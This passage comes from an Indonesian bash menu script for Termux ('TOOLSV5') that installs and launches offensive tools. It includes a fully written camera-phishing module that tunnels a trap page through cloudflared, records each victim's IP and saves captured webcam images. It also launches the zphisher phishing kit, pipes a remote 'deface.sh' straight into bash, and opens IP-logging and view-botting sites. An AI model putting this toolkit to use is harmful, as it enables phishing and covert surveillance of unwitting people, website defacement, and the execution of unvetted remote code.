                                                                                           $e
                                                                                           tutorial
                                                                                           xdg-open 'https://mega.nz/file/qxZkxDSQ#7SlOwXYV-YCh490MJJjo1uuURqSXUo_TVHYZ1S9h94o'
                                                                                    fi
                                                                             done
                                                                      elif [ "$no" = "12" ]; then
                                                                             while true; do
                                                                                    nexphisher="$PREFIX/opt/zphisher"
                                                                                    if [ -d "$nexphisher" ]; then
                                                                                           e $k "Membuka TOOLS"
                                                                                           sleep 5
                                                                                           cd $nexphisher
                                                                                           bash zphisher.sh
                                                                                           break
                                                                                    else
                                                                                           play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                                           e $k "Menginstall package$h "
                                                                                           cd $PREFIX
                                                                                           mkdir opt
                                                                                           cd opt
                                                                                           $paket install -y tur-repo
                                                                                           $paket install -y zphisher
                                                                                           git clone --depth=1 https://github.com/htr-tech/zphisher.git
                                                                                    fi
                                                                             done
                                                                             e "$k"
                                                                      elif [ "$no" = "ngrok" ]; then
                                                                             while true; do
                                                                                    clear
                                                                                    ngrok="$DIR_SAVE/ngrok"
                                                                                    if [ -d "$ngrok" ]; then
                                                                                           cd $ngrok
                                                                                           clear
                                                                                           cowsay -f eyes "Hello Boy ! Anda Berada Di Ngrok" | lolcat
                                                                                           echo
                                                                                           e $k "Mau Menggunakan Metode Apa ? http / tcp ? "
                                                                                           read -p "G404☠️localhost ( http - tcp ) : " manakocak
                                                                                           play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                                                                                           clear
                                                                                           cowsay -f eyes "Hello Boy ! Anda Berada Di Ngrok" | lolcat
                                                                                           echo
                                                                                           e $k "Mau Pake Port Apa ?$m contoh:$h 8080"
                                                                                           read -p "G404☠️localhost : " port
                                                                                           clear
                                                                                           e $h "NYALAKAN DULU$m HOTSPOT$h ANDA"
                                                                                           read -p "ENTER UNTUK MEMULAI"
                                                                                           play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                                                                                           ./ngrok $manakocak $port
                                                                                           break
                                                                                    else
                                                                                           play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                                           clear
                                                                                           e $k "INSTALL NGROK"
                                                                                           sleep 2
                                                                                           cd $DIR_SAVE
                                                                                           git clone --depth 32 https://github.com/GALIRUS404/ngrok
                                                                                           cd ngrok
                                                                                           tar -xzvf ngrok-v3-stable-linux-arm64.tgz
                                                                                           clear
                                                                                           read -p "Masukkan AuthToken Ngrok Anda : " tokenlu
                                                                                           ./ngrok config add-authtoken $tokenlu
                                                                                           clear
                                                                                           e $h "NGROK SUDAH TERINSTAL DI LENGKAP I DENGAN TOKEN ANDA"
                                                                                           sleep 5
                                                                                    fi
                                                                                    ENTER
                                                                             done
                                                                      elif [ "$no" = "13" ]; then
                                                                             cek_akses
                                                                             e "$ran8 Enter Buat liat Tutorialnya"
                                                                             read
                                                                             xdg-open "https://mega.nz/file/uwplzKBJ#PbJyMfr8xR72W4pcQH-fhHnoM4oe5-xOk0PeLyXYLsA"
                                                                             $e "$h SILAHKAN ENTER UNTUK MASUK KE BROWSER"
                                                                             read
                                                                             termux-open "https://huggingface.co/spaces/AI4Editing/MagicQuill"
                                                                      elif [ "$no" = "14" ]; then
                                                                             if [ -f "$edukasi" ]; then
                                                                                    echo
                                                                             else
                                                                                    e $bld "Silahkan Tonton Video Tutorial"
                                                                                    mpv --volume=150 --shuffle --cache=yes --cache-secs=10 "https://od.lk/s/OV8yNDY0NTk1NzZf/tutorial.mp3" &> /dev/null
                                                                                    xdg-open "https://vt.tiktok.com/ZSMeUJkUC/"
                                                                                    sleep 5
                                                                             fi
                                                                             bash <(curl -sL https://od.lk/s/OV8yNTA3OTg3NDBf/deface.sh)
                                                                      elif [ "$no" = "15" ]; then
                                                                             while true; do
                                                                                    clear
                                                                                    adb="$DIR_SAVE/adbwebkit"
                                                                                    if [ -d "$adb" ]; then
                                                                                           cd $adb
                                                                                           php -S 127.0.0.1:8000 &> /dev/null &
                                                                                           xdg-open "http://127.0.0.1:8000"
                                                                                           break
                                                                                    else
                                                                                           play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                                           cd $DIR_SAVE
                                                                                           git clone --depth 32 https://github.com/jxroot/adbwebkit.git
                                                                                           cd adbwebkit
                                                                                    fi
                                                                                    ENTER
                                                                             done
                                                                      elif [ "$no" = "16" ]; then
                                                                             while true; do
                                                                                    userfinder="$DIR_SAVE/UserFinder"
                                                                                    if [ -d "$userfinder" ]; then
                                                                                           cd $userfinder
                                                                                           git pull
                                                                                           e $k "MEMBUKA SCRIPT"
                                                                                           sleep 3
                                                                                           clear
                                                                                           bash UserFinder.sh
                                                                                           read -p "Silahkan Enter Ini akan Masuk ke TOOLSV5 lagi"
                                                                                           e "$k"
                                                                                           break
                                                                                    else
                                                                                           play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                                           clear
                                                                                           sleep 2
                                                                                           e $k "Menginstall PENJELAJAH NAME"
                                                                                           cd $DIR_SAVE
                                                                                           git clone --depth 32 https://github.com/mishakorzik/UserFinder
                                                                                           cd UserFinder
                                                                                    fi
                                                                             done
                                                                      elif [ "$no" = "17" ]; then
                                                                             cek_akses
                                                                             while true; do
                                                                                    camhack="/sdcard/CAM-DUMPER"
                                                                                    if [ -d "$camhack" ]; then
                                                                                           e $k "MEMBUKA CAM HACK"
                                                                                           sleep 2
                                                                                           clear
                                                                                           cd $camhack
                                                                                           git stash &> /dev/null
                                                                                           git pull origin main &> /dev/null
                                                                                           clear
                                                                                           rm -rf sendlink
                                                                                           rm Log.log *.zip > /dev/null 2>&1 || true
                                                                                           mv *.png captured_files/old > /dev/null 2>&1 || true
                                                                                           mv captured_files/new/*.png captured_files/old/ > /dev/null 2>&1 || true
                                                                                           #              mkdir -p $HOME/.serveo > /dev/null 2>&1 || true
                                                                                           #              touch $HOME/.serveo/serveo.yml
                                                                                           #              adr=$(cat $HOME/.serveo/serveo.yml)
                                                                                           #              if [[ $adr != *"web_addr: 80"* ]]; then
                                                                                           #               echo "web_addr: 80" >> $HOME/.serveo/serveo.yml
                                                                                           #              fi
                                                                                           stop() {
                                                                                                  checkcloudflared=$(pgrep cloudflared)
                                                                                                  if [[ -n "$checkcloudflared" ]]; then
                                                                                                         killall cloudflared > /dev/null 2>&1
                                                                                                         e "${k}Proses cloudflared dihentikan.${res}"
                                                                                                  fi
                                                                                           }

                                                                                           trap 'printf "\n"; stop' SIGINT
                                                                                           banner() {
                                                                                                  banner5
                                                                                                  e "${h}CAM PHISHING PENGEMBANG GALIRUS OFFICIAL${res}"
                                                                                                  e "${p}Version : Beta 1.0.0${res}"
                                                                                           }
                                                                                           dependencies() {
                                                                                                  if ! command -v php &> /dev/null; then
                                                                                                         e "${k}PHP tidak terinstal, menginstal...${res}"
                                                                                                         $paket install php -y || $paket install php -y || {
                                                                                                                e "${m}Gagal menginstal PHP. Aborting.${res}" && exit 1
                                                                                                         }
                                                                                                  fi
                                                                                                  if ! command -v which &> /dev/null; then
                                                                                                         e "${k}WHICH tidak terinstal, menginstal...${res}"
                                                                                                         $paket install which -y || $paket install which -y || {
                                                                                                                e "${m}Gagal menginstal WHICH. Aborting.${res}" && exit 1
                                                                                                         }
                                                                                                  fi
                                                                                                  #               if ! command -v ssh &> /dev/null; then
                                                                                                  #                e "${k}SSH tidak terinstal, menginstal...${res}"
                                                                                                  #                $paket install openssh -y || $paket install openssh-client -y || {
                                                                                                  #                 e "${m}Gagal menginstal SSH. Aborting.${res}" && exit 1
                                                                                                  #                }
                                                                                                  #               fi
                                                                                                  if ! command -v unzip &> /dev/null; then
                                                                                                         e "${k}unzip tidak terinstal, menginstal...${res}"
                                                                                                         $paket install unzip -y || $paket install unzip -y || {
                                                                                                                e "${m}Gagal menginstal unzip. Aborting.${res}" && exit 1
                                                                                                         }
                                                                                                  fi
                                                                                                  if ! command -v wget &> /dev/null; then
                                                                                                         e "${k}wget tidak terinstal, menginstal...${res}"
                                                                                                         $paket install wget -y || $paket install wget -y || {
                                                                                                                e "${m}Gagal menginstal wget. Aborting.${res}" && exit 1
                                                                                                         }
                                                                                                  fi
                                                                                                  if ! command -v jq &> /dev/null; then
                                                                                                         e "${k}jq tidak terinstal, menginstal...${res}"
                                                                                                         $paket install jq -y || $paket install jq -y || {
                                                                                                                e "${m}Gagal menginstal jq. Aborting.${res}" && exit 1
                                                                                                         }
                                                                                                  fi
                                                                                                  if ! command -v cloudflared &> /dev/null; then
                                                                                                         e "${k}Cloudflared tidak terinstal, menginstal...${res}"
                                                                                                         $paket install cloudflared -y || $paket install cloudflared -y || {
                                                                                                                e "${m}Gagal menginstal Cloudflared. Aborting.${res}" && exit 1
                                                                                                         }
                                                                                                  fi
                                                                                           }
                                                                                           catch_ip() {
                                                                                                  ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
                                                                                                  IFS=$'\n'
                                                                                                  e "${y}[${res}${p}+${res}${y}] IP:${res}${p} $ip${res}"
                                                                                                  cat ip.txt >> saved.ip.txt
                                                                                           }
                                                                                           checkfound() {
                                                                                                  e "\n"
                                                                                                  e "${g}[${res}${p}*${res}${g}] Tunggu Target,${res}${p} Klik q Lalu Enter untuk Keluar (setop)...${res}"
                                                                                                  while true; do
                                                                                                         read -t 1 -p "" user_input
                                                                                                         if [[ $user_input == 'q' ]]; then
                                                                                                                e "\n${m}Keluar dari pengecekan...${res}"
                                                                                                                stop
                                                                                                                break
                                                                                                         fi
                                                                                                         if [[ -e "ip.txt" ]]; then
                                                                                                                e "\n${g}[${res}+${g}] Target Membuka Link!${res}"
                                                                                                                catch_ip
                                                                                                                rm -rf ip.txt
                                                                                                         fi
                                                                                                         sleep 0.5
                                                                                                         if [[ -e "Log.log" ]]; then
                                                                                                                clear
                                                                                                                banner | lolcat
                                                                                                                e "${p} Klik q Lalu Enter untuk Keluar (setop)...${res}"
                                                                                                                e "\n${g}[${res}+${g}] Gambar Masuk Ke /sdcard/capture_file/new${res}"
                                                                                                                mv *.png /sdcard/CAM-DUMPER/captured_files/new > /dev/null 2>&1 || true
                                                                                                                tree /sdcard/CAM-DUMPER/captured_files/new
                                                                                                                rm -rf Log.log
                                                                                                         fi
                                                                                                         sleep 0.5
                                                                                                  done
                                                                                           }
                                                                                           start() {
                                                                                                  while true; do
                                                                                                         clear
                                                                                                         dependencies
                                                                                                         banner | lolcat
                                                                                                         e "${g}Pilih metode akses:${res}"
                                                                                                         #                e "1. Serveo.net"
                                                                                                         e "1. Cloudflared"
                                                                                                         e "0. back toolsv5"
                                                                                                         read -p "Pilih opsi [1/0]: " option
                                                                                                         if [[ $option == '11' ]]; then
                                                                                                                e "${p}[${res}${y}+${res}${p}] Starting Serveo...${res}"
                                                                                                                $(which sh) -c 'ssh -n -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:1912 serveo.net > sendlink ' &
                                                                                                                sleep 8
                                                                                                                send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
                                                                                                                e "${y}[${res}${p}+${res}${y}] Silahkan Salin Link:${res}${p} $send_link${res}"
                                                                                                                checkfound
                                                                                                         elif [[ $option == '1' ]]; then
                                                                                                                cd "$camhack"
                                                                                                                e "${p}[${res}${y}+${res}${p}] Starting Cloudflared...${res}"
                                                                                                                php -S localhost:1912 > /dev/null 2>&1 &
                                                                                                                sleep 3
                                                                                                                cloudflared tunnel --url http://localhost:1912 > sendlink 2>&1 &
                                                                                                                sleep 8
                                                                                                                send_link=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" sendlink)
                                                                                                                e "${y}[${res}${p}+${res}${y}] Silahkan Salin Link:${res}${p} $send_link${res}"
                                                                                                                sed 's+forwarding_link+'"$send_link"'+g' "cam-dumper.html" > index2.html
                                                                                                                sed 's+forwarding_link+'"$send_link"'+g' "template.php" > index.php
                                                                                                                checkfound
                                                                                                         elif [[ $option == "0" ]]; then
                                                                                                                break
                                                                                                         else
                                                                                                                e "${m}Pilihan tidak valid.${res}"
                                                                                                                sleep 3
                                                                                                         fi
                                                                                                  done
                                                                                           }

                                                                                           start
                                                                                           break
                                                                                    else
                                                                                           play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                                           e "${k}Menginstall Cam Hack${res}"
                                                                                           sleep 2
                                                                                           $paket install -y git php wget curl jq openssh cloudflared
                                                                                           cd /sdcard
                                                                                           git clone --depth 32 https://github.com/GALIRUS404/CAM-DUMPER
                                                                                           cd CAM-DUMPER
                                                                                           git pull origin main &> /dev/null
                                                                                           tutorial
                                                                                           xdg-open 'https://mega.nz/file/7gQTjZpT#K8pnhx5wWSCQmWmASb9L174beNaPLL9wBeYXZmr3J28'
                                                                                    fi
                                                                             done
                                                                      elif [ "$no" = "18" ]; then
                                                                             cek_akses
                                                                             while true; do
                                                                                    dir="$PREFIX/share"
                                                                                    cek="gemoxi"
                                                                                    if [ -d "$dir/$cek" ]; then
                                                                                           cd $dir
                                                                                           cd $cek
                                                                                           git pull origin main &> /dev/null
                                                                                           git stash &> /dev/null
                                                                                           module="$dir/$cek/node_modules"
                                                                                           if [ -d "$module" ]; then
                                                                                                  cd $dir
                                                                                                  cd $cek
                                                                                                  curl -sL -k -o config.json "https://od.lk/s/NzNfOTQ3OTY4MTlf/gemini" &> /dev/null | e $h "Sabar Admin sedang Memasangkan Apikey$res"
                                                                                                  play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                                                                                                  clear
                                                                                                  banner_skill() {
                                                                                                         echo -e "
$m⠀ ⠀⠀⠀⣶⡆⠀⠀⠀⢀⣴⢦⠀⠀⠀⠀⣖⡶⠀⠀⠀⠀⡏⡧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣷⡀⠀⠀⢀⣿⣧⡀⠀⠀⢠⣾⣧⠀⠀⠀⣠⣾⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣦⡀⣼⣿⣿⣷⡀⢠⣿⣿⣿⡆⢀⣾⣿⣿⡇⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠋⠙⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
$k⠀⠀⠀⠀⠠⣤⣉⣙⠛⠛⠛⠿⠿⠁⣴⣦⡈⠻⠛⠛⠛⢛⣉⣁⡤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠶⣶⣆⠈⢿⡿⠃⣠⣶⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⢠⣿⣿⣶⣶⣤⣤⣤⣤⡀⢁⣠⣤⣤⣤⣶⣶⣿⣿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⣿⡏⠉⠙⠛⠿⢿⣿⣿⣾⣿⡿⠿⠛⠋⠉⠹⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⢿⣧⣀⠀⠀⣀⣀⣼⡿⣿⣯⣀⣀⠀⠀⣀⣼⡿⠗⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠁⠘⣿⣿⣿⣿⣿⠟⠉
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣇⣀⣀⣹⣿⣿⣿⠃
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠿⣿⡿⢿⣿⠿⣿⡇
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⢀⣿⡇⢸⣿⡀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
                                                                                                  }
                                                                                                  banner_skill
                                                                                                  node -e "$(
                                                                                                         cat << 'EOF'
process.noDeprecation = true;
const express = require("express");
const path = require("path");
const fs = require("fs");
const app = express();
const CONFIG_FILE = "config.json";
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));
const loadApiKey = () => {
try {
if (fs.existsSync(CONFIG_FILE)) {
const config = JSON.parse(fs.readFileSync(CONFIG_FILE, "utf-8"));
return config.apiKey || null;
}
} catch (err) {
console.error("Error loading config:", err);
}
return null;
};
const saveApiKey = (apiKey) => {
fs.writeFileSync(CONFIG_FILE, JSON.stringify({ apiKey }, null, 2));
};
const promptForApiKey = async () => {
const readline = require("readline").createInterface({
input: process.stdin,
output: process.stdout,
});
return new Promise((resolve) => {
readline.question("\nApi Belum Terpasang!\nSilahkan Ambil Api Anda Sendiri: https://aistudio.google.com/app/apikey\nPaste Api Anda Disini: ", (apiKey) => {
readline.close();
saveApiKey(apiKey);
console.log("\n✓ API Key saved successfully!\n");
resolve(apiKey);
});
});
};
app.post("/api/generate", async (req, res) => {
const prompt = req.body.prompt || "Write a story about a magical bag.";
const apiKey = loadApiKey();
if (!apiKey) {
return res.status(400).json({ error: "API Key not found!" });
}
const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${apiKey}`;
try {
const response = await fetch(url, {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({
contents: [{ parts: [{ text: prompt }] }],
}),
});
const data = await response.json();
if (data.candidates && data.candidates[0] && data.candidates[0].content) {
const generatedText = data.candidates[0].content.parts[0].text;
res.json({ response: generatedText });
} else {
res.status(400).json({ error: "No results found." });
}
} catch (err) {
console.error("Error:", err);
res.status(500).json({ error: "Server error occurred." });
}
});
app.get("/", (req, res) => {
res.sendFile(path.join(process.cwd(), "index.html"));
});
const initializeServer = async () => {
let apiKey = loadApiKey();
if (!apiKey) {
apiKey = await promptForApiKey();
}
app.listen(3000, () => {
console.log("=======================================");
console.log("       GEMINI AI TOOLS WEBSITE           ");
console.log("=======================================");
console.log("Server is running at: http://localhost:3000");
console.log("Use this tool to generate AI content.\n");
});
};
initializeServer();
EOF
                                                                                                  )"
                                                                                                  break
                                                                                           else
                                                                                                  play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                                                  e $m $bg_lg"Node Modules Tidak Terinstall"$res
                                                                                                  cd $dir/$cek
                                                                                                  echo '{
"name": "gemoxi",
"version": "1.0.0",
"description": "Galirus Official",
"main": "server.js",
"scripts": {
"start": "node server.js"
},
"dependencies": {
"express": "^4.21.2"
}
}' > package.json
                                                                                                  yarn
                                                                                                  e $h $bg_lg"Node Module Terpasang Silahkan Ulang I$res"
                                                                                                  sleep 3
                                                                                           fi
                                                                                           break
                                                                                    else
                                                                                           play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                                           e $m $bg_lg"Sabar Brek Installasi package"$res
                                                                                           cd $PREFIX/share/
                                                                                           git clone --depth 32 https://github.com/Hozowaorokananingenda/gemoxi &> /dev/null || echo "SEDANG MENGINSTALL PAKET"
                                                                                           git pull origin main &> /dev/null
                                                                                           git stash &> /dev/null
                                                                                           $paket install yarn -y
                                                                                    fi
                                                                             done
                                                                      elif [ "$no" = "19" ]; then
                                                                             clear
                                                                             e $k "MEMBUKA BROWSING CHECK HOSTING"
                                                                             sleep 3
                                                                             xdg-open "https://check-host.net/"
                                                                      elif [ "$no" = "20" ]; then
                                                                             cek_akses
                                                                             clear
                                                                             xdg-open "https://zefoy.com/"
                                                                      elif [ "$no" = "21" ]; then
                                                                             e $k "Membuka browsing"
                                                                             sleep 3
                                                                             xdg-open "https://grabify.link/"
                                                                      elif [ "$no" = "22" ]; then
                                                                             Downloadnowatermark
                                                                      elif [ "$no" = "23" ]; then
                                                                             cek_akses
                                                                             GREEN='\033[0;32m'
                                                                             YELLOW='\033[1;33m'
                                                                             NC='\033[0m'
                                                                             URLS=()
                                                                             banner() {
                                                                                    echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⣤⣤⡴⣶⣶⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⣿⣿⣿⣿⣿⣿⣷⣿⣶⣿⣧⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⠿⠿⠛⠛⠛⠋⠉⠉⠉⠛⠛⠛⠛⠿⠟⠛⠛⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣟⡁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠴⠿⠿⠿⣿⣿⣷⣦⡀⠀⠀⠀⠀
⠀⠀⠀⢰⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣶⣄⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣦⣤⣤⣀⣀⣀⣀⣠⣤⠴⠖⠋⢉⣽⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠧⡀
⠀⠀⢠⣿⠟⠉⠁⠈⠉⠉⠙⠛⠛⠿⠿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
⠀⢠⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠽⠟⠛⠉⠀⢀⣀⣤⣴⣶⣶⣶⣶⣶⣶⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣷⣶⣦⣤⣤⣤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠈⠉⠛⠿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⠘⢿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⣿⣴⣿⣿⣄⠀⠀⠀⠀⠀⣀⣠⣴⠶⣿⣿⠋⠉⠉⠉⠙⢻⣿⡆⠀⠀⠀⠀⠀⠀⣀⣴⣶⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢹⣿⡍⠛⠻⢷⣶⣶⣶⠟⢿⣿⠗⠀⠹⠃⡀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⢀⣴⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠛⠂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⡇⠀⠀⠀⢻⣿⣿⠀⠈⠛⠀⠀⠀⢹⠇⠀⠀⠀⠀⢶⣿⠇⠀⢀⣴⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠁⠀⠀⠀⠀⠹⡇⠀⠀⠀⠀⠀⣀⡾⠀⠀⠀⠀⠀⢸⡿⠀⣠⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⣦⠀⠀⢠⣿⢳⠀⠀⠀⠙⣿⣿⠁⢰⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⣷⡾⠿⠃⢸⣷⣀⠀⢀⣾⠃⢀⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⠻⠷⢾⣿⣿⣷⡿⠁⠀⢸⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢿⣷⣄⠀⠀⠉⠛⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣦⣄⡀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣶⣶⣾⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠿⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
[   UPLOADING FILE V.1.0.0 BETA   ]
⠀    ⠀ ⠀⠀[⠀ DEVELOPMENT BY GALIRUS OFFICIAL⠀⠀]⠀⠀
⠀⠀⠀⠀
"
                                                                             }
                                                                             upload_file() {
                                                                                    local file="$1"
                                                                                    if [ ! -f "$file" ]; then
                                                                                           echo -e "${YELLOW}File tidak ditemukan:$NC $file"
                                                                                           return
                                                                                    fi
                                                                                    clear
                                                                                    banner | lolcat
                                                                                    echo -e "${YELLOW}Uploading:$NC $file ..."
                                                                                    local response=$(curl -sf -F "file=@$file" https://0x0.st)
                                                                                    if [ $? -eq 0 ]; then
                                                                                           clear
                                                                                           banner | lolcat
                                                                                           echo -e "${GREEN}Upload sukses!$NC"
                                                                                           URLS+=("$response")
                                                                                    else
                                                                                           echo -e "${YELLOW}Upload gagal untuk file:$NC $file"
                                                                                    fi
                                                                             }
                                                                             while true; do
                                                                                    clear
                                                                                    banner | lolcat
                                                                                    read -p "Masukkan jalur file: " filepath
                                                                                    upload_file "$filepath"
                                                                                    read -p "Apakah anda ingin menambahkan file lagi? (y/n): " add_more
                                                                                    if [[ $add_more != "y" && $add_more != "Y" ]]; then
                                                                                           break
                                                                                    fi
                                                                             done
                                                                             clear
                                                                             banner | lolcat
                                                                             echo -e "\n${GREEN}Daftar URL hasil upload:$NC"
                                                                             for url in "${URLS[@]}"; do
                                                                                    echo "$url"
                                                                             done
                                                                             echo
                                                                             echo
                                                                             echo
                                                                             read -p "Silahkan Enter Untuk Kembali ke TOOLSV5"
                                                                      elif [ "$no" = "down24" ]; then
                                                                             while true; do
                                                                                    tempmail="$DIR_SAVE/Temp-Mail"
                                                                                    if [ -d "$tempmail" ]; then
                                                                                           e $h "Anda Sudak Menginstall...❗"
                                                                                           sleep 3
                                                                                           clear
                                                                                           cd $tempmail
                                                                                           read -p " Username ( Terserah ) : " ala
                                                                                           node temp.js $ala
                                                                                           break
                                                                                    else
                                                                                           play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                                           e $k "installasi package...❗"
                                                                                           $paket install -y nodejs-lts
                                                                                           cd $DIR_SAVE
                                                                                           git clone --depth 32 https://github.com/Yadav210012/Temp-Mail
                                                                                    fi
                                                                             done
                                                                             ENTER
                                                                      elif [ "$no" = "25" ]; then
                                                                             clear
                                                                             text="SUBSCRIBE GALIRUS OFFICIAL YOUTUBE"
                                                                             duration=10
                                                                             length=${#text}
                                                                             steps=100
                                                                             sleep_time=0.1
                                                                             function loading_effect() {
                                                                                    start_time=$(date +%s)
                                                                                    while true; do
                                                                                           for ((i = 0; i <= length; i++)); do
                                                                                                  echo -ne "\r${text:0:i}$(echo "${text:i}" | tr '[:upper:]' '[:lower:]')"
                                                                                                  sleep "$sleep_time"
                                                                                                  current_time=$(date +%s)
                                                                                                  elapsed_time=$((current_time - start_time))
                                                                                                  if [ "$elapsed_time" -ge "$duration" ]; then
                                                                                                         xdg-open "https://www.youtube.com/@GalirusProjects"
                                                                                                         break 2
                                                                                                  fi
                                                                                           done
                                                                                    done
                                                                                    echo -ne "\r$text"
                                                                                    echo ""
                                                                             }
                                                                             e "$h"
                                                                             loading_effect
                                                                             track_ip_address() {
                                                                                    read -p "Masukkan IP: " input_ip
                                                                                    ip_info=$(curl -s "https://ipinfo.io/$input_ip/json")
                                                                                    ip_address=$(echo "$ip_info" | jq -r '.ip')
                                                                                    hostname=$(echo "$ip_info" | jq -r '.hostname // "N/A"')
